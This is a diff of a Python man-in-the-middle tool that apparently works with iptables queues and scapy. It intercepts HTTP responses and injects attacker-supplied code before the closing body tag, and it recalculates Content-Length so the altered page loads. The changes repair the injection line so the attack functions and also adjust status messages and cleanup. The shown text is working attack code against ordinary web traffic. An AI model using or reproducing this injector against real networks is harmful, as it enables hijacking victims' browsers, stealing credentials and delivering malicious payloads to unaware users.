@@ -81,18 +81,21 @@ def run_queue(destination, qnum):
     else:
         print("[-] Unknown destination")
 
+    print("[+] Setting up connections ...")
     # Create netfilterqueue instance
     queue = netfilterqueue.NetfilterQueue()
     # Bind queue number 0 (queue zero in iptables)
     queue.bind(qnum, process_packet)
     # Run the queue
     queue.run()
+    print("[+] Ready ...")
 
 
 def restore():
+    print("[+] Restoring connections and stopping apache2 ...")
     subprocess.call("iptables --flush", shell=True)
     subprocess.call("service apache2 stop", shell=True)
-    print("[+] Quitting.")
+    print("[+] Done.")
 
 
 def forge_packet(packet, load):
@@ -124,8 +127,8 @@ def process_packet(packet):
         ):
             print("[+] Response")
             print("[+] Injection")
-            load = load.replace("</body>" + options.code + "</body>")
-            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            load = load.replace("</body>", options.code + "</body>")
+            content_length_search = re.search(r"(?:Content-Length:\s)(\d*)", load)
 
             if content_length_search and "text/html" in load:
                 content_length = content_length_search.group(1)
@@ -133,8 +136,8 @@ def process_packet(packet):
                 load = load.replace(content_length, str(new_content_length))
 
         if load != scapy_packet[scapy.Raw].load:
-            new_packet = forge_packet(scapy_packet, load)
-            packet.set_payload(str(new_packet))
+            forged_packet = forge_packet(scapy_packet, load)
+            packet.set_payload(str(forged_packet))
 
     packet.accept()
 
@@ -147,5 +150,5 @@ try:
     apache_start()
     run_queue(options.destination, 0)
 except KeyboardInterrupt:
-    print("[+] \nDetected CTRL+C ... Restoring normal connections ...")
+    print("\n[+] Detected CTRL+C ... ")
     restore()
